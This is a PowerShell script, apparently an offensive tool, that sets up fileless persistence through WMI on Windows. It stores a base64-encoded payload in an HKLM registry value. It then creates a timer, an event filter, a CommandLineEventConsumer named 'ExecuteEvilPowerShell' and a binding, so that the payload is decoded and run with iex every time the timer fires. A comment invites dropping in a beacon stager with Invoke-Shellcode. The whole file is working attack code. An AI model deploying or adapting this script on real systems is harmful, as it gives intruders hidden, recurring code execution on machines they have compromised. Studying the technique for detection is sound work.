# Step #1 - Prep payload
$Hive = 'HKLM'
$PayloadKey = 'SOFTWARE\PayloadKey'
$PayloadValue = 'PayloadValue'
$TimerName = 'PayloadTrigger'
$EventFilterName = 'TimerTrigger'
$EventConsumerName = 'ExecuteEvilPowerShell'

switch ($Hive) {
    'HKLM' { $HiveVal = [UInt32] 2147483650 }
    'HKCU' { $HiveVal = [UInt32] 2147483649 }
    'HKU'  { $HiveVal = [UInt32] 2147483651 }
    'HKCR' { $HiveVal = [UInt32] 2147483648 }
    'HKCC' { $HiveVal = [UInt32] 2147483653 }
}

$TimerArgs = @{
    IntervalBetweenEvents = ([UInt32] 12000) # 43200000 to trigger every 12 hours
    SkipIfPassed = $False
    TimerId = $TimerName
}
# i.e. payload will be stored in HKLM\SOFTWARE\PayloadKey - PayloadValue (REG_SZ)

$Payload = {
    # Prep your raw beacon stager along with Invoke-Shellcode here

    "Owned at $(Get-Date)" | Out-File C:\payload_result.txt
}

$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

# Payload to be executed in the CommandLineEventConsumer upon triggering of the __IntervalTimerInstruction event.
$StagerPayload = "powershell.exe -NoP -C `"iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path $($Hive):\$PayloadKey -Name $PayloadValue).$PayloadValue)))`""

# Step #2 - Create payload reg key
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name CreateKey -ArgumentList @($HiveVal, $PayloadKey)
if ($Result.ReturnValue -ne 0) {
    Write-Warning "Unable to create key: HKLM\$PayloadKey. Return value: $($Result.ReturnValue)"
}

# Step #3 - Store payload in reg value
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name SetStringValue -ArgumentList @($HiveVal, $PayloadKey, $EncodedPayload, $PayloadValue)
if ($Result.ReturnValue -ne 0) {
    Write-Warning "Unable to store payload in HKLM\$PayloadKey $PayloadValue (REG_SZ). Return value: $($Result.ReturnValue)"
}

# Step #4 - Validate that the payload stored
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name GetStringValue -ArgumentList @($HiveVal, $PayloadKey, $PayloadValue)
if ($Result.ReturnValue -ne 0) {
    Write-Warning "Unable to store payload in HKLM\$PayloadKey $PayloadValue (REG_SZ). Return value: $($Result.ReturnValue)"
}

if ($Result.sValue -ne $EncodedPayload) {
    Write-Warning "The payload was not properly stored in HKLM\$PayloadKey $PayloadValue (REG_SZ)."
}

# Step #5 - Create the timer event
$Timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs

# Step #6 - Create event filter
$EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = $EventFilterName
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"
    QueryLanguage = 'WQL'
}

$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

# Step #7 - Create CommandLineEventConsumer
$CommandLineConsumerArgs = @{
    Name = $EventConsumerName
    CommandLineTemplate = $StagerPayload
}

$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

# Step #8 - Create FilterToConsumerBinding
$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

